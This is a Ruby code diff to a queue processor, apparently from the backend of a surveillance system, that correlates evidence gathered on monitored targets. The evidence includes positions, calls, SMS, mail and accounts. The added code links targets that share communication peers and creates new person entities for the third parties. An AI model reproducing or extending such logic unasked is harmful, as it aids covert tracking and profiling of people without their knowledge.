@@ -25,8 +25,9 @@ class Processor
     loop do
       # get the first entry from the queue and mark it as processed to avoid
       # conflicts with multiple processors
-      if (entry = IntelligenceQueue.where(flag: NotificationQueue::QUEUED).find_and_modify({"$set" => {flag: NotificationQueue::PROCESSED}}, new: false))
-        count = IntelligenceQueue.where({flag: NotificationQueue::QUEUED}).count()
+      if (queued = IntelligenceQueue.get_queued)
+        entry = queued.first
+        count = queued.last
         trace :info, "#{count} evidence to be processed in queue"
         process entry
       else
@@ -38,15 +39,26 @@ class Processor
 
 
   def self.process(entry)
-    evidence = Evidence.collection_class(entry['target_id']).find(entry['evidence_id'])
-
-    # respect the license
-    return if ['position', 'camera'].include? evidence.type and not LicenseManager.instance.check :correlation
-
     entity = Entity.any_in({path: [Moped::BSON::ObjectId.from_string(entry['target_id'])]}).first
 
-    trace :info, "Processing #{evidence.type} for entity #{entity.name}"
+    case entry['type']
+      when :evidence
+        evidence = Evidence.collection_class(entry['target_id']).find(entry['ident'])
+        trace :info, "Processing evidence #{evidence.type} for entity #{entity.name}"
+        process_evidence(entity, evidence)
 
+      when :aggregate
+        aggregate = Aggregate.collection_class(entry['target_id']).find(entry['ident'])
+        trace :info, "Processing aggregte for entity #{entity.name}"
+        process_aggregate(entity, aggregate)
+    end
+
+  rescue Exception => e
+    trace :error, "Cannot process intelligence: #{e.message}"
+    trace :fatal, e.backtrace.join("\n")
+  end
+
+  def self.process_evidence(entity, evidence)
     case evidence.type
       when 'position'
         # save the last position of the entity
@@ -63,10 +75,40 @@ class Processor
         # analyze the accounts
         Accounts.add_handle(entity, evidence)
     end
+  end
 
-  rescue Exception => e
-    trace :error, "Cannot process evidence: #{e.message}"
-    trace :fatal, e.backtrace.join("\n")
+  def self.process_aggregate(entity, aggregate)
+    # process the aggregate and link the entities
+
+    # normalize the type to search for the correct account
+    type = [aggregate.type]
+    type = ['phone'] if ['call', 'sms', 'mms'].include? aggregate.type
+    type = ['mail', 'gmail'] if ['mail', 'gmail'].include? aggregate.type
+
+    # search for existing entity with that account and link it (direct link)
+    if ((peer = Entity.where({:_id.ne => entity._id, "handles.handle" => aggregate.data['peer'], :path => entity.path.first}).in("handles.type" => type).first))
+      RCS::DB::LinkManager.instance.add_link(from: entity, to: peer, level: :automatic, type: :peer, versus: aggregate.data['versus'].to_sym, info: type.first)
+      return
+    end
+
+    # search if two entities are communicating with a third party and link them (indirect link)
+    ::Entity.targets.where(:_id.ne => entity._id, path: entity.path.first).each do |e|
+
+      trace :debug, "Checking if '#{entity.name}' and '#{e.name}' have common peer: #{aggregate.data['peer']} #{type}"
+
+      next unless Aggregate.collection_class(e.path.last).summary_include?(type.first, aggregate.data['peer'])
+
+      trace :debug, "Peer found, creating new entity... #{aggregate.data['peer']} #{type}"
+
+      # create the new entity
+      name = Entity.name_from_handle(type.first, aggregate.data['peer'], e.path.last)
+      name ||= aggregate.data['peer']
+      ghost = Entity.create!(name: name, type: :person, level: :automatic, path: [entity.path.first])
+
+      # the entities will be linked on callback
+      ghost.handles.create!(level: :automatic, type: type.first, handle: aggregate.data['peer'])
+    end
+
   end
 
 end
